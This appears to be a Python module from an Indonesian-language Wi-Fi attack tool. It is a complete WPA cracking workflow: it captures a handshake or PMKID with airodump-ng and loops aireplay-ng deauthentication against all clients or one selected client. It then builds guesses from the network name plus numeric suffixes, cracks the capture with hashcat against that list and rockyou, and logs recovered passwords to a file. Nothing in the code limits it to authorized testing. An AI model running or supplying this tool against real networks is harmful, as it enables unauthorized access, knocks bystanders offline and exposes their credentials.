import os, sys, time, subprocess, re, threading

class HandshakeCapture:
    def __init__(self, config, colors):
        self.config = config
        self.colors = colors
        # Lokasi wordlist standar Kali Linux
        self.rockyou = "/usr/share/wordlists/rockyou.txt"
        self.rockyou_gz = "/usr/share/wordlists/rockyou.txt.gz"

    def _check_handshake(self, cap_file):
        """Verifier: Cek apakah file .cap berisi Handshake atau PMKID"""
        if not os.path.exists(cap_file): return False
        try:
            cmd = ["aircrack-ng", cap_file]
            proc = subprocess.run(cmd, capture_output=True, text=True)
            output = proc.stdout.lower()
            if "1 handshake" in output or "wpa (1)" in output or "pmkid" in output:
                return True
        except: pass
        return False

    def _prepare_rockyou(self):
        """Ekstrak rockyou.txt jika masih dalam bentuk .gz"""
        c = self.colors
        if os.path.exists(self.rockyou):
            return True
        if os.path.exists(self.rockyou_gz):
            print(f"  {c.INFO} Extracting rockyou.txt.gz... (Mohon Tunggu)")
            subprocess.run(f"sudo gunzip -k {self.rockyou_gz}", shell=True)
            return True
        return False

    def _generate_suffix_passwords(self, essid, wordlist_path, bssid=None):
        """Generator: Mode Append - Variasi Kapital, Spasi, & Pembersihan Angka"""
        c = self.colors
        passwords = set()

        # 1. CLEANING: Ambil kata pertama dan buang angka di buntutnya
        # Contoh: "azkiya46" -> "azkiya"
        base_raw = essid.split()[0] if " " in essid else essid
        base_clean = re.sub(r'\d+$', '', base_raw) 
        
        # Jika nama wifi isinya angka semua, biarkan apa adanya
        if not base_clean: 
            base_clean = base_raw

        print(f"  {c.INFO} {c.W}APPENDING:{c.G} Menambah variasi {c.Y}{base_clean}{c.NC} ke wordlist...")

        # 2. VARIATION ENGINE
        bases = [
            base_clean.lower(),      # azkiya
            base_clean.upper(),      # AZKIYA
            base_clean.capitalize()  # Azkiya
        ]

        for b in bases:
            # Tambahkan kata dasar murni (hanya jika minimal 8 karakter)
            if len(b) >= 8:
                passwords.add(b)
            
            for i in range(1, 100):
                suffix = f"{i:02d}"
                
                # Pola: Azkiya01
                comb1 = f"{b}{suffix}"
                if len(comb1) >= 8: passwords.add(comb1)
                
                # Pola: Azkiya 01 (Pakai Spasi)
                comb2 = f"{b} {suffix}"
                if len(comb2) >= 8: passwords.add(comb2)

        # 3. WRITING (Mode 'a' untuk Append)
        try:
            os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
            
            with open(wordlist_path, "a") as f:
                # sorted(passwords) supaya rapi, meski di-append akan tetap di bawah
                for pw in sorted(passwords):
                    f.write(f"{pw}\n")

            print(f"  {c.OK} {c.G}DONE:{c.W} Berhasil menambah {c.Y}{len(passwords)}{c.W} pola ke {wordlist_path}")
            return True
        except Exception as e:
            print(f"  {c.ERR} Gagal update pass.txt: {e}")
            return False
            

    def _get_vendor(self, mac):
        """Identifikasi vendor perangkat berdasarkan MAC"""
        try:
            vendors = {"Apple": ["74:AC:5F"], "Samsung": ["BC:47:60"], "Oppo": ["7C:38:AD"], "Xiaomi": ["28:6C:07"]}
            prefix = mac[:8].upper().replace("-", ":")
            for name, prefixes in vendors.items():
                if prefix in prefixes: return name
            return "Unknown Device"
        except: return "Device"

    def _get_clients(self, bssid, channel, iface):
        """Scan klien aktif untuk Targeted Deauth"""
        c = self.colors
        print(f"\n  {c.INFO} Scanning active clients (10s)...")
        temp_file = "/tmp/client_scan"
        scan_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", temp_file, "--output-format", "csv", iface]
        proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        try: time.sleep(10)
        finally:
            proc.terminate()
            proc.wait()
        
        clients_data = []
        csv_path = f"{temp_file}-01.csv"
        if os.path.exists(csv_path):
            with open(csv_path, 'r') as f:
                content = f.read()
                if "Station MAC" in content:
                    stations_part = content.split("Station MAC")[1]
                    for line in stations_part.strip().split("\n"):
                        cols = line.split(",")
                        if len(cols) > 0:
                            mac = cols[0].strip()
                            if re.match(r"([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})", mac):
                                vendor = self._get_vendor(mac)
                                clients_data.append({"mac": mac, "vendor": vendor})
            os.remove(csv_path)
        return clients_data

    def start_capture(self, targets):
        c = self.colors
        if not targets: 
            print(f"\n{c.ERR} Target list empty!{c.NC}")
            return

        # --- SELECT TARGET ---
        try:
            if len(targets) == 1:
                target = targets[0]
                print(f"\n{c.OK} Auto-selecting: {c.Y}{target.get('essid')}{c.NC}")
            else:
                val = input(f"\n{c.Q} Select Target ID (1-{len(targets)}): ").strip()
                target = targets[int(val)-1]
        except: return

        bssid, channel = target['bssid'], target['ch']
        essid_raw = target.get('essid', 'Unknown')
        essid_safe = essid_raw.replace(" ", "_")
        iface = self.config.iface
        wordlist_pribadi = "/home/kali/WIFIRO/pass.txt"

        # --- MODE DEAUTH ---
        print(f"\n  {c.BOLD}{c.W}DEAUTH MODE:{c.NC}")
        print(f"  [{c.C}1{c.NC}] Broadcast (Kick All)")
        print(f"  [{c.C}2{c.NC}] Targeted  (Kick One)")
        mode = input(f"\n  {c.Q} Choice (1/2): ").strip()

        client_mac = None
        if mode == "2":
            clients = self._get_clients(bssid, channel, iface)
            if not clients: 
                print(f"  {c.ERR} No clients found! Defaulting to Broadcast.")
            else:
                for i, obj in enumerate(clients): 
                    print(f"  [{c.C}{i+1}{c.NC}] {c.G}{obj['vendor']}{c.NC} ({obj['mac']})")
                try: 
                    client_mac = clients[int(input(f"\n  {c.Q} Select Client ID: "))-1]['mac']
                except: client_mac = None

        # --- SETUP OUTPUT ---
        output_dir = "captures"
        if not os.path.exists(output_dir): os.makedirs(output_dir)
        output_base = f"{output_dir}/{essid_safe}_{bssid.replace(':', '')}"
        cap_file, hc_file = f"{output_base}-01.cap", f"{output_base}.hc22000"

        # --- CRACKING ENGINE ---
        def run_crack_flow():
            print(f"\n\n  {c.OK} {c.G}DAPET BRO! Memulai proses cracking...{c.NC}")
            
            # --- UPDATE WORDLIST PRIBADI DENGAN SUFFIX ---
            self._generate_suffix_passwords(essid_raw, wordlist_pribadi)
            
            subprocess.run(f"hcxpcapngtool -o {hc_file} {cap_file}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
                success = False
                for current_wl in [wordlist_pribadi, self.rockyou]:
                    if not os.path.exists(current_wl):
                        if current_wl == self.rockyou: self._prepare_rockyou()
                        else: continue

                    wl_name = "PRIBADI" if current_wl == wordlist_pribadi else "ROCKYOU"
                    print(f"  {c.INFO} {c.W}Cracking via {c.Y}{wl_name}{c.NC}...")
                    
                    stop_anim = False
                    def animate():
                        start_t = time.time()
                        while not stop_anim:
                            idx = int((time.time()*8)%20)
                            bar = "░" * idx + "█" + "░" * (19-idx)
                            sys.stdout.write(f"\r  {c.OK} {c.W}[{bar}] {c.G}TRYING {wl_name}... {c.DG}({int(time.time()-start_t)}s){c.NC}")
                            sys.stdout.flush(); time.sleep(0.1)

                    t = threading.Thread(target=animate); t.start()
                    
                    cmd = f"hashcat -m 22000 {hc_file} {current_wl} --force --quiet --outfile-format=2 --potfile-disable"
                    try:
                        result = subprocess.check_output(cmd, shell=True, text=True).strip()
                        stop_anim = True; t.join()
                        
                        if result:
                            # Ambil password dari output hashcat
                            password = result.split('\n')[-1].split(':')[-1]
                            
                            # --- LOGIKA SIMPAN OTOMATIS KE succes.txt ---
                            save_file = "succes.txt"
                            # Format sesuai permintaan: Target(nama wifi) Password: ... Sumber: ...
                            log_entry = f"Target({essid_raw}) Password: {password} Sumber: {wl_name}\n"
                            
                            try:
                                with open(save_file, "a") as f:
                                    f.write(log_entry)
                                save_status = f"{c.G}Saved to {save_file}{c.NC}"
                            except:
                                save_status = f"{c.ERR}Failed to save{c.NC}"
                            # --------------------------------------------

                            print(f"\n\n  {c.G}┌──────────────────────────────────────────────────┐{c.NC}")
                            print(f"    {c.BOLD}{c.W}WIFI  :{c.NC} {c.Y}{essid_raw}{c.NC}")
                            print(f"    {c.BOLD}{c.W}PASS  :{c.NC} {c.G}{password}{c.NC}")
                            print(f"    {c.BOLD}{c.W}SOURCE:{c.NC} {c.C}{wl_name}{c.NC}")
                            print(f"    {c.BOLD}{c.W}STATUS:{c.NC} {save_status}")
                            print(f"  {c.G}└──────────────────────────────────────────────────┘{c.NC}")
                            
                            success = True; break
                    except:
                        stop_anim = True; t.join()
                        print(f"\n  {c.ERR} Tidak ditemukan di wordlist {wl_name}.")
                
                if not success: 
                    print(f"\n  {c.ERR} ZONK! Password gagal ditemukan di semua wordlist.")
            else: 
                print(f"\n  {c.ERR} Gagal convert handshake.")
            input(f"\n  {c.Q} Tekan [ENTER] untuk kembali ke menu...")

        # --- EXECUTION ---
        try:
            cap_proc = subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", output_base, iface], stdout=subprocess.DEVNULL)
            
            # PHASE 1: PMKID
            for i in range(15, 0, -1):
                sys.stdout.write(f"\r  {c.OK} {c.W}Phase 1: PMKID {c.Y}[{i:02d}s]{c.NC} ")
                sys.stdout.flush()
                if self._check_handshake(cap_file): 
                    cap_proc.terminate(); run_crack_flow(); return
                time.sleep(1)

            # PHASE 2: DEAUTH
            print(f"\n  {c.WARN} Starting Deauth Loop...")
            deauth_cmd = ["aireplay-ng", "-0", "5", "-a", bssid]
            if client_mac: deauth_cmd += ["-c", client_mac]
            deauth_cmd += ["--ignore-negative-one", iface]
            
            count = 0
            while True:
                count += 1
                sys.stdout.write(f"\r  {c.OK} Loop [{count:03d}] | Waiting Handshake... ")
                sys.stdout.flush()
                subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
                if self._check_handshake(cap_file): 
                    cap_proc.terminate(); run_crack_flow(); break
                time.sleep(10)
        except KeyboardInterrupt: 
            print(f"\n\n  {c.ERR} Aborted.{c.NC}")
        finally:
            if 'cap_proc' in locals(): cap_proc.terminate()
            self.config.set_managed_mode(iface)
